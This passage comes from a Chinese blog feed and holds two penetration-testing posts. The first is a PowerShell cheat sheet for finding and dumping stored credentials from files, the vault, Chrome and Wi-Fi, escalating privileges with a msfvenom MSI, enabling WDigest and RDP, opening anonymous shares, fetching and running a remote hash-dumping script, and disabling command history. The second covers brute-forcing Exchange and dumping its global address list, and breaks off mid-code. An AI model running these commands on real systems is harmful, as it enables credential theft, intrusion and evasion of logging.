class="hljs-number">5</span>&#125;<br></code></pre></td></tr></table></figure><p>  Where-Object里面的$_是形式变量，代表每次迭代的文件。</p></li><li><p>轮询进程</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$process_name</span> = <span class="hljs-string">&#x27;svchost&#x27;</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$true</span>)&#123;<br>    <span class="hljs-variable">$processes</span> = <span class="hljs-built_in">Get-Process</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$processes</span>.name <span class="hljs-operator">-contains</span> <span class="hljs-variable">$process_name</span>)<br>        <span class="hljs-built_in">Get-Process</span> <span class="hljs-variable">$process_name</span>|<span class="hljs-built_in">Stop-Process</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>  或者 <code>(Get-Process $process_name).kill()</code> 关也一样</p></li><li><p>编辑注册表</p><p>  下面这个路径是一个安全的注册表路径，在这里修改注册表不会造成严重的系统问题。所以我们把它保存为一个变量。</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;HKCU:\Control Panel\Desktop&quot;</span><br></code></pre></td></tr></table></figure><p>  如果要新建注册表项，可以使用New-Item命令。我们可以使用注册表编辑器regedit来验证项是否创建成功。</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-Item</span> –Path <span class="hljs-variable">$path</span> –Name HelloKey<br></code></pre></td></tr></table></figure><p>  如果要修改项的属性，使用Set-ItemProperty命令。</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-ItemProperty</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-name</span> Fake <span class="hljs-literal">-Value</span> fuck<br></code></pre></td></tr></table></figure><p>  最后，如果要删除项的属性，使用Remove-ItemProperty命令。</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-ItemProperty</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-name</span> Fake<br></code></pre></td></tr></table></figure><p>  如果要删除整个注册表项，使用Remove-Item命令。</p>  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Remove-Item</span> <span class="hljs-literal">-path</span> <span class="hljs-variable">$path</span>\hellokey <span class="hljs-literal">-Recurse</span><br></code></pre></td></tr></table></figure><p>  未完待续。。。</p></li></ul><hr><h2 id="在渗透中的应用"><a href="#在渗透中的应用" class="headerlink" title="在渗透中的应用"></a>在渗透中的应用</h2><h3 id="敏感文件："><a href="#敏感文件：" class="headerlink" title="敏感文件："></a>敏感文件：</h3><ul><li><p>识别敏感文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li><li><p>从sysprep中或unattend中寻找文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li><li><p>寻找包含 “密码”字符 的配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *.txt,*.xml,*.config,*.conf,*.cfg,*.ini <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;password&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>在配置文件中查找数据库凭证（例如web.config）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> *.config,*.conf,*.xml <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">Select-String</span> <span class="hljs-literal">-Pattern</span> <span class="hljs-string">&quot;connectionString&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>找到web服务器配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> c:\ <span class="hljs-literal">-Include</span> web.config,applicationHost.config,php.ini,httpd.conf,httpd<span class="hljs-literal">-xampp</span>.conf,my.ini,my.cnf <span class="hljs-operator">-File</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure><h3 id="抓取凭证："><a href="#抓取凭证：" class="headerlink" title="抓取凭证："></a>抓取凭证：</h3></li><li><p>从Windows PasswordVault获取存储的密码（web凭据）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">Windows.Security.Credentials.PasswordVault</span>,<span class="hljs-type">Windows.Security.Credentials</span>,<span class="hljs-type">ContentType</span>=<span class="hljs-type">WindowsRuntime</span>];(<span class="hljs-built_in">New-Object</span> Windows.Security.Credentials.PasswordVault).RetrieveAll() | % &#123; <span class="hljs-variable">$_</span>.RetrievePassword();<span class="hljs-variable">$_</span> &#125;<br></code></pre></td></tr></table></figure><p><img src="/img/article/typora-user-images%5Cimage-20210106115024800.png" alt="image-20210106115024800"></p></li><li><p>从Windows凭据管理器获取存储的密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-StoredCredential</span> | % &#123; <span class="hljs-built_in">write-host</span> <span class="hljs-literal">-NoNewLine</span> <span class="hljs-variable">$_</span>.username; <span class="hljs-built_in">write-host</span> <span class="hljs-literal">-NoNewLine</span> <span class="hljs-string">&quot;:&quot;</span> ; <span class="hljs-variable">$p</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::SecureStringToBSTR(<span class="hljs-variable">$_</span>.password) ; [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::PtrToStringAuto(<span class="hljs-variable">$p</span>); &#125;<br></code></pre></td></tr></table></figure></li><li><p>从Google Chrome浏览器中转储密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">System.Text.Encoding</span>]::UTF8.GetString([<span class="hljs-type">System.Security.Cryptography.ProtectedData</span>]::Unprotect(<span class="hljs-variable">$datarow</span>.password_value,<span class="hljs-variable">$null</span>,[<span class="hljs-type">System.Security.Cryptography.DataProtectionScope</span>]::CurrentUser))<br></code></pre></td></tr></table></figure></li><li><p>从无线配置文件获取存储的Wi-Fi密码（admin）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(netsh wlan show profiles) | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;\:(.+)<span class="hljs-variable">$</span>&quot;</span> | %&#123;<span class="hljs-variable">$name</span>=<span class="hljs-variable">$_</span>.Matches.Groups[<span class="hljs-number">1</span>].Value.Trim(); <span class="hljs-variable">$_</span>&#125; | %&#123;(netsh wlan show profile name=<span class="hljs-string">&quot;<span class="hljs-variable">$name</span>&quot;</span> key=<span class="hljs-built_in">clear</span>)&#125;  | <span class="hljs-built_in">Select-String</span> <span class="hljs-string">&quot;Key Content\W+\:(.+)<span class="hljs-variable">$</span>&quot;</span> | %&#123;<span class="hljs-variable">$pass</span>=<span class="hljs-variable">$_</span>.Matches.Groups[<span class="hljs-number">1</span>].Value.Trim(); <span class="hljs-variable">$_</span>&#125; | %&#123;[<span class="hljs-type">PSCustomObject</span>]<span class="hljs-selector-tag">@</span>&#123; PROFILE_NAME=<span class="hljs-variable">$name</span>;PASSWORD=<span class="hljs-variable">$pass</span> &#125;&#125; | <span class="hljs-built_in">Format-Table</span> <span class="hljs-literal">-AutoSize</span><br></code></pre></td></tr></table></figure></li><li><p>在注册表中搜索SNMP字符串</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gci</span> HKLM:\SYSTEM\CurrentControlSet\Services\SNMP <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue<br></code></pre></td></tr></table></figure></li><li><p>在注册表中搜索字符串模式</p><ul><li>以下PowerShell命令将筛选选定的注册表配置单元（HKCR，HKCU，HKLM，HKU和HKCC），并在注册表项名称或数据值中递归搜索任何选定的模式。在这种情况下，我们正在搜索“密码”模式：</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$pattern</span> = <span class="hljs-string">&quot;password&quot;</span><br><span class="hljs-variable">$hives</span> = <span class="hljs-string">&quot;HKEY_CLASSES_ROOT&quot;</span>,<span class="hljs-string">&quot;HKEY_CURRENT_USER&quot;</span>,<span class="hljs-string">&quot;HKEY_LOCAL_MACHINE&quot;</span>,<span class="hljs-string">&quot;HKEY_USERS&quot;</span>,<span class="hljs-string">&quot;HKEY_CURRENT_CONFIG&quot;</span><br><br><span class="hljs-comment"># Search in registry keys</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$r</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hives</span>) &#123; <span class="hljs-built_in">gci</span> <span class="hljs-string">&quot;registry::<span class="hljs-variable">$</span>&#123;r&#125;\&quot;</span> <span class="hljs-literal">-rec</span> <span class="hljs-literal">-ea</span> SilentlyContinue | <span class="hljs-built_in">sls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span> &#125;<br><br><span class="hljs-comment"># Search in registry values</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$r</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hives</span>) &#123; <span class="hljs-built_in">gci</span> <span class="hljs-string">&quot;registry::<span class="hljs-variable">$</span>&#123;r&#125;\&quot;</span> <span class="hljs-literal">-rec</span> <span class="hljs-literal">-ea</span> SilentlyContinue | % &#123; <span class="hljs-keyword">if</span>((<span class="hljs-built_in">gp</span> <span class="hljs-variable">$_</span>.PsPath <span class="hljs-literal">-ea</span> SilentlyContinue) <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span>) &#123; <span class="hljs-variable">$_</span>.PsPath; <span class="hljs-variable">$_</span> | <span class="hljs-built_in">out-string</span> <span class="hljs-literal">-stream</span> | <span class="hljs-built_in">sls</span> <span class="hljs-string">&quot;<span class="hljs-variable">$pattern</span>&quot;</span> &#125;&#125;&#125;<br></code></pre></td></tr></table></figure><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3></li><li><p>搜索注册表以获取自动登录凭据（例如Credssp）</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#x27;</span> | <span class="hljs-built_in">select</span> <span class="hljs-string">&quot;Default*&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>检查是否已启用AlwaysInstallElevated</p><ul><li>如果以下AlwaysInstallElevated注册表项设置为1，则意味着任何低特权用户都可以使用NT AUTHORITY \ SYSTEM特权安装* .msi文件.</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKCU:\Software\Policies\Microsoft\Windows\Installer&#x27;</span> <span class="hljs-literal">-Name</span> AlwaysInstallElevated<br><span class="hljs-built_in">gp</span> <span class="hljs-string">&#x27;HKLM:\Software\Policies\Microsoft\Windows\Installer&#x27;</span> <span class="hljs-literal">-Name</span> AlwaysInstallElevated<br><br><span class="hljs-comment"># 可以使用msf生成msi安装包</span><br>msfvenom <span class="hljs-literal">-p</span> windows/exec CMD=<span class="hljs-string">&#x27;net localgroup administrators joe /add&#x27;</span> <span class="hljs-operator">-f</span> msi &gt; pkg.msi<br></code></pre></td></tr></table></figure></li><li><p>查找未用引号包含的服务路径</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">gwmi</span> <span class="hljs-literal">-class</span> Win32_Service <span class="hljs-literal">-Property</span> Name, DisplayName, PathName, StartMode | <span class="hljs-built_in">Where</span> &#123;<span class="hljs-variable">$_</span>.StartMode <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Auto&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.PathName <span class="hljs-operator">-notlike</span> <span class="hljs-string">&quot;C:\Windows*&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$_</span>.PathName <span class="hljs-operator">-notlike</span> <span class="hljs-string">&#x27;&quot;*&#x27;</span>&#125; | <span class="hljs-built_in">select</span> PathName,DisplayName,Name<br></code></pre></td></tr></table></figure></li><li><p>检查LSASS WDigest缓存（明文凭据）</p><ul><li>0位禁用，1为启用</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 查询</span><br>(<span class="hljs-built_in">gp</span> registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest).UseLogonCredential<br><br><span class="hljs-comment"># 启用（启用必须要重启才生效）</span><br><span class="hljs-built_in">sp</span> registry::HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Wdigest <span class="hljs-literal">-name</span> UseLogonCredential <span class="hljs-literal">-value</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure></li><li><p>GPP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Push-Location</span> \\example.com\sysvol<br><span class="hljs-built_in">gci</span> * <span class="hljs-literal">-Include</span> *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-EA</span> SilentlyContinue | <span class="hljs-built_in">select-string</span> password<br><span class="hljs-built_in">Pop-Location</span><br></code></pre></td></tr></table></figure><h3 id="内部网络以及服务"><a href="#内部网络以及服务" class="headerlink" title="内部网络以及服务"></a>内部网络以及服务</h3></li><li><p>启用RDP</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># Allow RDP connections</span><br>(<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-Class</span> <span class="hljs-string">&quot;Win32_TerminalServiceSetting&quot;</span> <span class="hljs-literal">-Namespace</span> root\cimv2\terminalservices).SetAllowTsConnections(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Disable NLA</span><br>(<span class="hljs-built_in">Get-WmiObject</span> <span class="hljs-literal">-class</span> <span class="hljs-string">&quot;Win32_TSGeneralSetting&quot;</span> <span class="hljs-literal">-Namespace</span> root\cimv2\terminalservices <span class="hljs-literal">-Filter</span> <span class="hljs-string">&quot;TerminalName=&#x27;RDP-tcp&#x27;&quot;</span>).SetUserAuthenticationRequired(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># Allow RDP on the firewall</span><br><span class="hljs-built_in">Get-NetFirewallRule</span> <span class="hljs-literal">-DisplayGroup</span> <span class="hljs-string">&quot;Remote Desktop&quot;</span> | <span class="hljs-built_in">Set-NetFirewallRule</span> <span class="hljs-literal">-Enabled</span> True<br></code></pre></td></tr></table></figure></li><li><p>创建smb匿名共享</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">new-item</span> <span class="hljs-string">&quot;c:\users\public\share&quot;</span> <span class="hljs-literal">-itemtype</span> directory<br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;sharedir&quot;</span> <span class="hljs-literal">-Path</span> <span class="hljs-string">&quot;C:\users\public\share&quot;</span> <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&quot;Everyone&quot;</span>,<span class="hljs-string">&quot;Guests&quot;</span>,<span class="hljs-string">&quot;Anonymous Logon&quot;</span><br><br><span class="hljs-comment"># 停用</span><br><span class="hljs-built_in">Remove-SmbShare</span> <span class="hljs-literal">-Name</span> <span class="hljs-string">&quot;sharedir&quot;</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure></li><li><p>将ip加入防火墙白名单</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">New-NetFirewallRule</span> <span class="hljs-literal">-Action</span> Allow <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;pentest&quot;</span> <span class="hljs-literal">-RemoteAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">15.123</span><br><br><span class="hljs-comment"># 删除</span><br><span class="hljs-built_in">Remove-NetFirewallRule</span> <span class="hljs-literal">-DisplayName</span> <span class="hljs-string">&quot;pentest&quot;</span><br></code></pre></td></tr></table></figure><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3></li><li><p>无文件加载攻击模块</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">iex</span>(<span class="hljs-built_in">iwr</span>(<span class="hljs-string">&quot;https://URL&quot;</span>))<br><br><span class="hljs-comment"># e.g.</span><br><span class="hljs-built_in">iex</span>(<span class="hljs-built_in">iwr</span>(<span class="hljs-string">&quot;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&quot;</span>));<span class="hljs-built_in">Get-PassHashes</span><br></code></pre></td></tr></table></figure></li><li><p>获取域内sid</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">([<span class="hljs-type">System.Security.Principal.WindowsIdentity</span>]::GetCurrent()).User.Value<br></code></pre></td></tr></table></figure></li><li><p>禁用PowerShell命令日志记录（很有用！！）</p><ul><li><p>默认情况下，PowerShell会自动在历史记录文件中记录多达4096个命令，就像Bash在Linux上一样。</p><p>PowerShell历史记录文件是一个纯文本文件，位于每个用户的配置文件中的以下位置：</p><ul><li>C：\ Users \ &lt;用户名&gt; \ AppData \ Roaming \ Microsoft \ Windows \ PowerShell \ PSReadline \ ConsoleHost_history.txt</li></ul></li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-PSReadlineOption</span> –HistorySaveStyle SaveNothing<br><span class="hljs-comment"># or</span><br><span class="hljs-built_in">Remove-Module</span> PSReadline<br><br><span class="hljs-comment"># 注意：这条命令会在历史中记录</span><br></code></pre></td></tr></table></figure></li><li><p>列出AV</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Get-CimInstance</span> <span class="hljs-literal">-Namespace</span> root/SecurityCenter2 <span class="hljs-literal">-ClassName</span> AntiVirusProduct<br></code></pre></td></tr></table></figure><p><img src="/img/article/typora-user-images%5Cimage-20210106121645232.png" alt="image-20210106121645232"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>Language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Language</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>excahnge在渗透中的利用</title>
    <link href="/2021/02/03/exchange/"/>
    <url>/2021/02/03/exchange/</url>
    
    <content type="html"><![CDATA[<h1 id="exchange在渗透中的利用"><a href="#exchange在渗透中的利用" class="headerlink" title="exchange在渗透中的利用"></a>exchange在渗透中的利用</h1><p>exchange在渗透中一般拥有者重要的作用，因为exchange一般会是少量甚至唯一暴露在外网的内网服务，且exchange默认拥有很高的权限，所以exchange多为攻击者关注的目标</p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="可爆破接口"><a href="#可爆破接口" class="headerlink" title="可爆破接口"></a>可爆破接口</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/ews/</span>exchange.asmx<br><span class="hljs-regexp">/autodiscover/</span>autodiscover.xml<br>/Microsoft-Server-ActiveSync<br></code></pre></td></tr></table></figure><h3 id="爆破工具"><a href="#爆破工具" class="headerlink" title="爆破工具"></a>爆破工具</h3><ul><li><strong><em>ruler</em></strong> : <a href="https://github.com/sensepost/ruler">https://github.com/sensepost/ruler</a></li><li><strong><em>EBurst</em></strong> : <a href="https://github.com/grayddq/EBurst">https://github.com/grayddq/EBurst</a></li></ul><h2 id="泄露信息"><a href="#泄露信息" class="headerlink" title="泄露信息"></a>泄露信息</h2><h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p>直接访问owa登录页源代码即可</p><p><img src="/img/article/typora-user-images/image-20201225115507399.png" alt="image-20201225115507399"></p><p>小版本号对比：<a href="https://technet.microsoft.com/en-us/library/hh135098(v=exchg.150).aspx">https://technet.microsoft.com/en-us/library/hh135098%28v=exchg.150%29.aspx</a></p><h3 id="内网ip"><a href="#内网ip" class="headerlink" title="内网ip"></a>内网ip</h3><p>把HTTP协议版本修改成1.0，然后去掉http头里面的HOST参数</p><p><img src="/img/article/123.jpg" alt="图片"></p><p>owa后要记得加<code>/</code></p><h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><p>访问owa接口时访问不存在的aspx文件</p><p>比如：<a href="https://mail.xx.xx/owa/auth/logon2.aspx">https://mail.xx.xx/owa/auth/logon2.aspx</a></p><p><img src="/img/article/typora-user-images/image-20201225111503509.png" alt="image-20201225111503509"></p><h3 id="内网域名"><a href="#内网域名" class="headerlink" title="内网域名"></a>内网域名</h3><p>访问basic auth接口时（前面提到的可爆破接口），抓取第二次认证发送的ntlm包，base64解密可获得域名</p><p><img src="/img/article/typora-user-images/image-20201225111930777.png" alt="image-20201225111930777"></p><p><img src="/img/article/typora-user-images/image-20201225112026434.png" alt="image-20201225112026434"></p><h2 id="导出gal（全局地址列表）"><a href="#导出gal（全局地址列表）" class="headerlink" title="导出gal（全局地址列表）"></a>导出gal（全局地址列表）</h2><h3 id="owa-接口"><a href="#owa-接口" class="headerlink" title="owa 接口"></a>owa 接口</h3><p>需要获得邮件用户的明文口令，登录OWA后，选择联系人-&gt;<code>All Users</code></p><h3 id="通过-ews"><a href="#通过-ews" class="headerlink" title="通过 ews"></a>通过 ews</h3><p><a href="https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/findpeople-operation?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/findpeople-operation?redirectedfrom=MSDN</a></p><p>工具：<a href="https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py">https://github.com/3gstudent/Homework-of-Python/blob/master/ewsManage.py</a></p><h3 id="通过-outlook-使用的协议（mapi-over-http、rpc-over-http）"><a href="#通过-outlook-使用的协议（mapi-over-http、rpc-over-http）" class="headerlink" title="通过 outlook 使用的协议（mapi over http、rpc over http）"></a>通过 outlook 使用的协议（mapi over http、rpc over http）</h3><ul><li><p>ruler (不支持rpc over http)</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ruler_windows_amd64.exe <span class="hljs-params">--insecure</span> <span class="hljs-params">--url</span> https:<span class="hljs-string">//MAIL/autodiscover/autodiscover.xml</span>  <span class="hljs-params">--email</span> daiker@Linton-Lab.com -u daiker -p 密码 <span class="hljs-params">--verbose</span> <span class="hljs-params">--debug</span> abk dump -o list.txt<br></code></pre></td></tr></table></figure></li><li><p>exchanger.py（impacket工具包）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> exchanger.py <span class="hljs-number">192.168.1.1</span>/test<span class="hljs-number">1</span>:DomainUser<span class="hljs-number">123</span>!@test.com nspi list-tables<br><span class="hljs-attribute">python</span> exchanger.py <span class="hljs-number">192.168.1.1</span>/test<span class="hljs-number">1</span>:DomainUser<span class="hljs-number">123</span>!@test.com nspi dump-tables -guid <span class="hljs-number">5</span>cb<span class="hljs-number">80229</span>-e<span class="hljs-number">2</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4447</span>-b<span class="hljs-number">224</span>-dc<span class="hljs-number">2</span>c<span class="hljs-number">12098835</span><br></code></pre></td></tr></table></figure></li><li><p>burp</p><p>登录owa后，左侧有人员，抓包</p><p>一个POST类型的包<br>POST /owa/service.svc?action=FindPeople&amp;ID=-34&amp;AC=1<br>Body中有这个字段</p><p><img src="/img/article/1234.jpg" alt="图片"></p><p>默认80，查看响应包，拉到最后，可以看到总的邮箱数量</p><p><img src="/img/article/12345.jpg" alt="图片"></p><p>右键copy as request(这一步需要装插件)，然后复制到python文件里面，后面的内容改下</p><p>最后一行原本是</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">requests.post(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers, <span class="hljs-attribute">cookies</span>=burp0_cookies)<br></code></pre></td></tr></table></figure><p>改为</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">r = requests.post(burp0_url, <span class="hljs-attribute">headers</span>=burp0_headers, <span class="hljs-attribute">cookies</span>=burp0_cookies)<br>j = r.json()<br>results = j.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;Body&#x27;</span>).<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;ResultSet&#x27;</span>)<br>import json<br><span class="hljs-builtin-name">print</span>(json.dumps(results))<br></code></pre></td></tr></table></figure><p>运行python</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">python 1.py |<span class="hljs-string"> jq &#x27;.[].EmailAddresses[0].EmailAddress&#x27; -r</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">uniq</span>|<br></code></pre></td></tr></table></figure><h3 id="通过OBA"><a href="#通过OBA" class="headerlink" title="通过OBA"></a>通过OBA</h3></li></ul><ol><li><p>读取Autodiscover配置信息,获取OABUrl</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td 